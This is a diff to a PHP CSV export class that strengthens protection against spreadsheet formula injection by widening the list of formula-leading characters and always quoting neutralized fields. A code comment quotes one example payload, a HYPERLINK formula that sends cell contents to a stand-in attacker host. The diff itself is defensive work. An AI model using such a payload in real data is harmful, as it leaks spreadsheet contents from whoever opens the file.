@@ -19,8 +19,8 @@ namespace Aggressive\Ads\Domain;
  * second is formula neutralization, which decides whether opening the file is
  * safe — and it is not a parsing concern at all.
  *
- * Excel, LibreOffice and Google Sheets treat a cell beginning `=`, `+`, `-`,
- * `@`, tab or carriage return as a formula, and evaluate it on open. A campaign
+ * Spreadsheet importers can interpret formula leaders and leading control
+ * characters as executable content. A campaign
  * named `=HYPERLINK("https://attacker.example/"&A1,"Click")` is a legal
  * campaign name that this plugin will accept, store, escape correctly for HTML,
  * and then hand to a reviewer's spreadsheet as executable content. Correct
@@ -34,10 +34,9 @@ final class Csv_Writer {
 	/**
 	 * Leading characters a spreadsheet reads as the start of a formula.
 	 *
-	 * Tab and carriage return are in the list because they can survive a
-	 * paste-and-import round trip and leave the next character leading.
+	 * Include line feed and full-width variants recognized by some locales.
 	 */
-	private const FORMULA_LEADERS = array( '=', '+', '-', '@', "\t", "\r" );
+	private const FORMULA_LEADERS = array( '=', '+', '-', '@', "\t", "\r", "\n", '＝', '＋', '－', '＠' );
 
 	/**
 	 * A byte order mark, so Excel reads the file as UTF-8.
@@ -100,7 +99,7 @@ final class Csv_Writer {
 		// Quote whenever a delimiter, quote or newline would otherwise break
 		// the row — and, once neutralized, whenever the leading apostrophe was
 		// added, so the guard cannot be stripped by a lenient parser.
-		if ( 1 === preg_match( '/[",\r\n]/', $value ) ) {
+		if ( $value !== $field || 1 === preg_match( '/[",\r\n]/', $value ) ) {
 			return '"' . str_replace( '"', '""', $value ) . '"';
 		}
 
@@ -110,10 +109,9 @@ final class Csv_Writer {
 	/**
 	 * Prefixes a formula-leading value so a spreadsheet treats it as text.
 	 *
-	 * A leading single quote is the convention every major spreadsheet honours
-	 * and strips on display, so the reader sees the original string. Escaping
-	 * the character instead — dropping it, or backslashing it — silently
-	 * changes data the advertiser typed.
+	 * Preserve the original text behind an apostrophe on the initial import.
+	 * Spreadsheet save/re-import behavior varies; CSV cannot enforce text types
+	 * across subsequent editing in every spreadsheet application.
 	 *
 	 * @param string $value Raw field.
 	 */
@@ -122,10 +120,12 @@ final class Csv_Writer {
 			return $value;
 		}
 
-		if ( ! in_array( $value[0], self::FORMULA_LEADERS, true ) ) {
-			return $value;
+		foreach ( self::FORMULA_LEADERS as $leader ) {
+			if ( str_starts_with( $value, $leader ) ) {
+				return "'" . $value;
+			}
 		}
 
-		return "'" . $value;
+		return $value;
 	}
 }
